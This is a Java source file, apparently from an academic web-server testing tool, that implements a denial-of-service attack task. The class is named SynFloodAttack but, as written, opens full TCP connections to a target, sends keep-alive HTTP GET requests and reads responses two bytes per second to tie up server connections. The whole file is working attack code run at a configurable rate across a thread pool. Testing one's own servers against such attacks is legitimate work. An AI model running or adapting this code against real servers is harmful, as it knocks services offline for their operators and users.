/*
 * SynFloodAttack.java
 * Oct 29, 2012
 *
 * FriendnFoe Attacker
 * 
 * Copyright (C) 2012 Chandan Raj Rupakheti
 * 
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public License 
 * as published by the Free Software Foundation, either 
 * version 3 of the License, or any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/lgpl.html>.
 * 
 */

package foe;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 
 * 
 * @author Chandan Raj Rupakheti (rupakhet@rose-hulman.edu)
 */
public class SynFloodAttack extends DOSAttack {
	private AtomicInteger floodSize;
	
	/**
	 * @param host
	 * @param port
	 * @param uris
	 * @param threadPool
	 * @param taskPerSecond
	 */
	public SynFloodAttack(String host, int port, String[] uris, int threadPool,
			int taskPerSecond) {
		super(host, port, uris, threadPool, taskPerSecond);
		this.floodSize = new AtomicInteger(0);
	}

	@Override
	public Runnable getTask() {
		Runnable task = new Runnable() {
			@Override
			public void run() {
				Socket socket = null;
				try {
					// Open socket connection to the server
					socket = new Socket(host, port);
				}
				catch(Exception e) {
					fireDOSExceptionEvent(e);
				}
				
				if(socket != null) {
					fireDOSRateUpdateEvent("Flood-Size", "" + floodSize.incrementAndGet());
					
					String uri = "/";
					if(uris.length != 0) {
						int random = ThreadLocalRandom.current().nextInt(0, uris.length);
						uri = uris[random];
					}
					
					// Prepare the request buffer
					StringBuffer buffer = new StringBuffer();
					buffer.append("GET " + uri + " HTTP/1.1");
					buffer.append("\r\n");
					buffer.append("connection: keep-alive");
					buffer.append("\r\n");
					buffer.append("accept-language: en-us,en;q=0.5");
					buffer.append("\r\n");
					buffer.append("host: " + host);
					buffer.append("\r\n");
					buffer.append("accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7");
					buffer.append("\r\n");
					buffer.append("accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
					buffer.append("\r\n");
					buffer.append("\r\n");
					
					try {
						// Write the request to the socket
						OutputStream outStream = socket.getOutputStream();
						PrintStream printStream = new PrintStream(outStream);
						printStream.print(buffer.toString());
						printStream.flush();
						
						// Read and ignore the request
						InputStream inStream = socket.getInputStream();
						byte[] chunk = new byte[2]; // read 2 byte chunk at a time
						
						// Keep reading until the end but ignore the data. 
						// which means do nothing
						while(inStream.read(chunk) != -1) {
							// Sleep a while
							Thread.sleep(1000);
						};
						
						socket.close();
					}
					catch(Exception e) {
						fireDOSExceptionEvent(e);
					}
				}
			}
		};
		return task;
	}
}
